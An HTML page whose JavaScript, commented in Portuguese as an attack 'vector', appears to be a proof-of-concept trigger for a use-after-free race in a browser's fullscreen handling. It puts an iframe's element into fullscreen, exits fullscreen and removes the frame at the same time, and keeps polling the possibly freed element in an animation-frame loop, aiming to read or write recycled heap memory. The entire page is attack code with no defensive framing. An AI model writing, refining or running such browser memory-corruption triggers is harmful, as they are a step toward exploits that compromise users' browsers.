<html>
<body>
<button id="run">Run V3</button>
<div id="status">Ready</div>
<script>
/*
  VETOR: exitFullscreen() + frame destruction race
  Entra em fullscreen, espera confirmar, então dispara
  exitFullscreen() e remove() simultaneamente.
  O rAF tenta dereferenciar o elemento no próximo frame de render
  — se o heap foi reusado, pode ler/escrever memória reciclada.
*/

var iframe = null;
var rafHandle = null;

function cleanup() {
    if (rafHandle) cancelAnimationFrame(rafHandle);
    rafHandle = null;
}

document.getElementById("run").onclick = function() {
    cleanup();

    iframe = document.createElement("iframe");
    iframe.style.width = "300px";
    iframe.style.height = "300px";
    document.body.appendChild(iframe);

    iframe.onload = function() {
        var iDoc = iframe.contentDocument;
        iDoc.open();
        iDoc.write('<html><body style="margin:0"><div id="fs" style="width:100%;height:100%;background:purple"></div></body></html>');
        iDoc.close();

        var fsEl = iDoc.getElementById("fs");

        // Entra fullscreen em elemento filho (não documentElement)
        // FullscreenManager guarda ponteiro para este Element específico
        fsEl.webkitRequestFullscreen();

        document.addEventListener('webkitfullscreenchange', function onEnter() {
            if (!document.webkitFullscreenElement) return;
            document.removeEventListener('webkitfullscreenchange', onEnter);

            document.getElementById("status").innerHTML = "Fullscreen ativo — disparando race";

            // RAF que tenta acessar o elemento no próximo frame de render
            // Este frame pode coincidir com o teardown do Document
            rafHandle = requestAnimationFrame(function rafTick() {
                try {
                    // Tentativa de acesso ao elemento possivelmente freed
                    var bounds = fsEl.getBoundingClientRect();
                    document.getElementById("status").innerHTML +=
                        " | rAF: bounds=" + JSON.stringify(bounds);
                } catch(e) {
                    document.getElementById("status").innerHTML += " | rAF EX:" + e;
                }
                rafHandle = requestAnimationFrame(rafTick);
            });

            // Dispara exit e remove simultaneamente
            document.exitFullscreen
                ? document.exitFullscreen()
                : document.webkitExitFullscreen && document.webkitExitFullscreen();

            iframe.remove(); // Document teardown enquanto exitFullscreen processa
            iframe = null;

            document.getElementById("status").innerHTML += " | exit+remove fired";

            // Para o RAF depois de alguns frames
            setTimeout(cleanup, 200);
        });
    };
};
</script>
</body>
</html>
